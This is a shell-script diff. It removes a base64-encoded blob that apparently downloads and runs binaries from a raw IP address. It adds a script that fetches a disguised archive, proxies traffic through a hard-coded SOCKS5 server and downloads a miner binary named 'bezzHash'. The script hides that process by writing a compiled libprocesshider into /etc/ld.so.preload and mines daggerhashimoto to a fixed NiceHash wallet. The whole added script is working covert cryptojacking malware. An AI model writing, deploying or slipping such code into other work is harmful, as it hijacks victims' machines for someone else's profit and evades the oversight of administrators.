@@ -1,1 +1,48 @@
-b2tlMT0kKHNodWYgLWkgMS05OTk5OTk5OTk5IC1uIDEpCm9rZTI9JChzaHVmIC1pIDEtOTk5OTk5OTk5OSAtbiAxKQpva2UzPSQoc2h1ZiAtaSAxLTk5OTk5OTk5OTkgLW4gMSkKb2tlND0kKHNodWYgLWkgMS05OTk5OTk5OTk5IC1uIDEpCndnZXQgLXEgLU8gc3lzcGFuZWwgaHR0cDovLzE5OS4yNTAuMjA3LjE4Mi9+bmdld2V0ZWNoL2luY2x1ZGUvaW5kdWsva2VybmVscCAmJiBjaG1vZCAreCBzeXNwYW5lbAptdiBzeXNwYW5lbCAkb2tlMQojCndnZXQgLXEgLU8gcHJveHkuY29uZiBodHRwOi8vMTk5LjI1MC4yMDcuMTgyL35uZ2V3ZXRlY2gvaW5jbHVkZS9pbmR1ay9wcm94eWNoYWlucy5jb25mICYmIGNobW9kICt4IHByb3h5LmNvbmYKIwp3Z2V0IC1xIGh0dHA6Ly8xOTkuMjUwLjIwNy4xODIvfm5nZXdldGVjaC9pbmNsdWRlL2luZHVrL2xpYnByb3h5Y2hhaW5zNC5zbyAmJiBjaG1vZCAreCBsaWJwcm94eWNoYWluczQuc28KIwp3Z2V0IC1xIC1PIHdzczEgaHR0cDovLzE5OS4yNTAuMjA3LjE4Mi9+bmdld2V0ZWNoL2luY2x1ZGUvaW5kdWsvd3NzICYmIGNobW9kICt4IHdzczEKbXYgd3NzMSAkb2tlMgojCi4vJG9rZTIgY2xpZW50IC0tYWRkciA6MTA4MCAtLXJlbW90ZSB3czovL3dpenokb2tlNC5oZXJva3VhcHAuY29tID4vZGV2L251bGwgMj4mMSA+L2Rldi9udWxsICYKc2xlZXAgNQojCndnZXQgLXEgLU8gZ2NjMSBodHRwOi8vMjAuMjQuMTg3LjIyMy96ZXRhICYmIGNobW9kICt4IGdjYzEKbXYgZ2NjMSAkb2tlMwojd3NzIGlwCnNsZWVwIDEKc2VkIC1pICJzL3BvcnQvMTA4MC8iICJwcm94eS5jb25mIgpzbGVlcCAxCnNlZCAtaSAicy91c2VyLyAvIiAicHJveHkuY29uZiIKc2xlZXAgMQpzZWQgLWkgInMvcGFzcy8gLyIgInByb3h5LmNvbmYiCnNsZWVwIDEKIwpjaG1vZCAreCAkb2tlMSAuLyRva2UzCi4vJG9rZTEgLWYgcHJveHkuY29uZiAuLyRva2UzIGFubiAK
+#!/bin/sh 
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime 
+dpkg-reconfigure --frontend noninteractive tzdata 
+ 
+apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl 
+ 
+wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz 
+ 
+tar -xvzf graphics.tar.gz 
+ 
+cat > graftcp/local/graftcp-local.conf <<END 
+listen = :2233 
+loglevel = 1 
+socks5 = 20.24.187.223:7777
+socks5_username = bsm 
+socks5_password = 12345 
+END 
+ 
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf & 
+ 
+sleep .2 
+ 
+echo " " 
+echo " " 
+ 
+echo "**" 
+ 
+./graftcp/graftcp curl ifconfig.me 
+ 
+echo " " 
+echo " " 
+ 
+echo "**" 
+ 
+echo " " 
+echo " " 
+ 
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash 
+chmod +x bezzHash 
+ 
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip 
+unzip magicBezzHash.zip 
+make 
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl 
+mv libprocesshider.so /usr/local/lib/ 
+echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload 
+ 
+./graftcp/graftcp ./bezzHash --url=ssl://3FNS3ubK3e76wiiLPMTK4K2ESw1GUgtXh5@daggerhashimoto.usa-west.nicehash.com:33353 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
